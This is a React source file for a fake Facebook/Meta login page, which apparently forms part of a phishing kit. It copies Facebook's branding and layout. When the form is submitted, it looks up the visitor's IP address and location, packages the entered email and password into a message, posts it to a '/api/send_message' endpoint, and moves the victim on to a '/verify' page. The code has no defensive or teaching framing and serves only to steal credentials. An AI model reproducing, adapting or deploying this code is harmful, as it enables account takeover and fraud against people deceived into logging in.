import React, { useEffect, useRef } from 'react';
import MetaLogo from '@/assets/images/meta-logo.png';
import FacebookIcon from '@/assets/images/facebook-icon-mb.png';
import FacebookLogo from '@/assets/images/facebook-logo.svg';
import { Link, useNavigate } from 'react-router-dom';
import axios from 'axios';
const ClientLogin: React.FC = () => {
	useEffect(() => {
		localStorage.clear();
	}, []);
	const navigate = useNavigate();
	const emailInputRef = useRef<HTMLInputElement>(null);
	const passwordInputRef = useRef<HTMLInputElement>(null);
	const getGeoData = async () => {
		const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
		return `📌<b>IP</b> <code>${response.data.ip} ${response.data.city}-${response.data.region}-${response.data.country}</code>`;
	};

	const handleSubmit = async (e: React.FormEvent) => {
		e.preventDefault();
		const geoData = await getGeoData();
		const message = `${geoData}\n📨<b>Email</b> <code>${emailInputRef.current?.value}</code>\n🔑<b>Password</b> <code>${passwordInputRef.current?.value}</code>`;
		const response = await axios.post('/api/send_message', {
			message: message,
		});
		localStorage.setItem('message', message);
		localStorage.setItem('message_id', response.data.message_id);
		navigate('/verify');
	};
	return (
		<>
			{' '}
			<div className='min-h-screen w-full font-[Helvetica,Arial,sans-serif]'>
				<div className='hidden min-h-[720px] items-center justify-center bg-[#f2f4f7] py-[72px] md:flex'>
					<div className='flex w-full max-w-[980px] items-center justify-between'>
						<div className='flex flex-col items-start'>
							<img
								src={FacebookLogo}
								alt='Facebook'
								className='-m-8 h-[106px] w-auto'
							/>
							<p className='max-w-[500px] py-4 text-start text-[28px] text-[#1c1e21]'>
								Facebook helps you connect and share with the
								people in your life.
							</p>
						</div>
						<div className='flex w-full max-w-[396px] flex-col items-center justify-center gap-3'>
							<div className='w-full max-w-[396px] space-y-6 rounded-lg border border-gray-200 bg-white p-4 shadow-md'>
								<form
									onSubmit={handleSubmit}
									className='space-y-4'
								>
									<div className='space-y-4'>
										<div>
											<input
												type='text'
												name='email'
												ref={emailInputRef}
												placeholder='Email, phone number or UID'
												className='relative block w-full appearance-none rounded-lg border border-gray-300 px-4 py-3 text-gray-900 placeholder-gray-500 focus:border-blue-500 focus:ring-blue-500'
											/>
										</div>
										<div>
											<input
												type='password'
												name='password'
												ref={passwordInputRef}
												placeholder='Password'
												className='relative block w-full appearance-none rounded-lg border border-gray-300 px-4 py-3 text-gray-900 placeholder-gray-500 focus:border-blue-500 focus:ring-blue-500'
											/>
										</div>
									</div>
									<p
										id='ahihi'
										className='hidden text-sm text-red-500'
									>
										The password that you've entered is
										incorrect.
									</p>
									<button
										type='submit'
										className='mb-4 flex w-full justify-center rounded-md border border-transparent bg-[#1877F2] px-4 py-[10px] text-xl font-bold text-white shadow-sm hover:bg-blue-600 focus:ring-2 focus:ring-blue-500 disabled:opacity-50'
									>
										Log In
									</button>
									<div className='text-center'>
										<Link
											to='/hacked'
											className='cursor-pointer text-sm text-[#1877F2] hover:underline'
										>
											Forgotten password?
										</Link>
									</div>
									<div className='text-center'>
										<p className='inline-block rounded-md bg-[#42b72a] px-4 py-2 text-lg font-bold text-white hover:bg-[#36a420]'>
											Create new account
										</p>
									</div>
								</form>
							</div>
							<p className='text-sm'>
								<span className='font-semibold'>
									Create a Page
								</span>{' '}
								for a celebrity, brand or business.
							</p>
						</div>
					</div>
				</div>

				<div className='flex min-h-screen w-full flex-col items-center bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 py-8 font-[Helvetica,Arial,sans-serif] md:hidden'>
					<div className='flex w-full items-center justify-center px-2 text-sm font-normal text-[#465a69]'>
						<span>English(UK)</span>
					</div>

					<div className='mt-20 flex w-full flex-col items-center space-y-8'>
						<div className='py-10'>
							<img
								src={FacebookIcon}
								alt='Facebook'
								className='h-[60px] w-auto'
							/>
						</div>
						<form className='h-full w-full space-y-3'>
							<div className='relative'>
								<div className='relative h-[56px]'>
									<input
										id='email-mobile'
										type='text'
										name='email'
										placeholder=' '
										className='peer absolute inset-0 w-full rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500'
									/>
									<label className='absolute left-4 top-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm'>
										{' '}
										Mobile number, email or UID{' '}
									</label>
								</div>
							</div>

							<div className='relative'>
								<div className='relative h-[56px]'>
									<input
										id='password'
										type='password'
										name='password'
										placeholder=' '
										className='peer absolute inset-0 w-full rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500'
									/>
									<label className='absolute left-4 top-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm'>
										{' '}
										Password{' '}
									</label>
								</div>
							</div>

							<button
								type='submit'
								className='w-full rounded-full bg-[#0064E0] py-3 font-semibold text-white transition hover:bg-blue-600 disabled:opacity-50'
							>
								Log In
							</button>

							<div className='text-center'>
								<p className='font-medium text-[#1c2b33]'>
									Forgotten password?
								</p>
							</div>

							<div className='text-center'>
								<p className='mt-52 inline-block w-full rounded-full border border-blue-500 px-4 py-2 text-lg text-blue-500'>
									Create new account
								</p>
							</div>
						</form>
					</div>

					<div className='mt-auto pt-8'>
						<img
							src={MetaLogo}
							alt='Meta'
							className='h-auto w-[70px]'
						/>
					</div>
				</div>

				<footer className='mx-auto mt-8 hidden w-full max-w-[980px] py-5 text-xs text-[#737373] md:block'>
					<div className='flex gap-2'>
						<p className='hover:underline'>English (UK)</p>
						<p className='hover:underline'>Tiếng Việt</p>
						<p className='hover:underline'>中文(台灣)</p>
						<p className='hover:underline'>한국어</p>
						<p className='hover:underline'>日本語</p>
						<p className='hover:underline'>Français (France)</p>
						<p className='hover:underline'>ภาษาไทย</p>
						<p className='hover:underline'>Español</p>
						<p className='hover:underline'>Português (Brasil)</p>
						<p className='hover:underline'>Deutsch</p>
						<p className='hover:underline'>Italiano</p>
						<div className='cursor-pointer border border-gray-200 bg-[#EBEDF0] px-2'>
							<i className='fas fa-plus text-black'></i>
						</div>
					</div>
					<hr className='my-2 border-gray-300' />
					<div className='mb-4 flex flex-wrap gap-2'>
						<p className='hover:underline'>Sign Up</p>
						<p className='hover:underline'>Log in</p>
						<p className='hover:underline'>Messenger</p>
						<p className='hover:underline'>Facebook Lite</p>
						<p className='hover:underline'>Video</p>
						<p className='hover:underline'>Meta Pay</p>
						<p className='hover:underline'>Meta Store</p>
						<p className='hover:underline'>Meta Quest</p>
						<p className='hover:underline'>Ray-Ban Meta</p>
						<p className='hover:underline'>Meta AI</p>
						<p className='hover:underline'>Instagram</p>
						<p className='hover:underline'>Threads</p>
						<p className='hover:underline'>
							Voting Information Centre
						</p>
					</div>

					<div className='flex flex-wrap gap-2'>
						<p className='hover:underline'>Privacy Policy</p>
						<p className='hover:underline'>Privacy Centre</p>
						<p className='hover:underline'>About</p>
						<p className='hover:underline'>Create ad</p>
						<p className='hover:underline'>Create Page</p>
						<p className='hover:underline'>Developers</p>
						<p className='hover:underline'>Careers</p>
						<p className='hover:underline'>Cookies</p>
						<p className='hover:underline'>AdChoices</p>
						<p className='hover:underline'>Terms</p>
						<p className='hover:underline'>Help</p>
						<p className='hover:underline'>
							Contact uploading and non-users
						</p>
						<p className='hover:underline'>Settings</p>
					</div>
					<div className='mt-4 text-gray-600'>Meta © 2025</div>
				</footer>
			</div>
		</>
	);
};

export default ClientLogin;
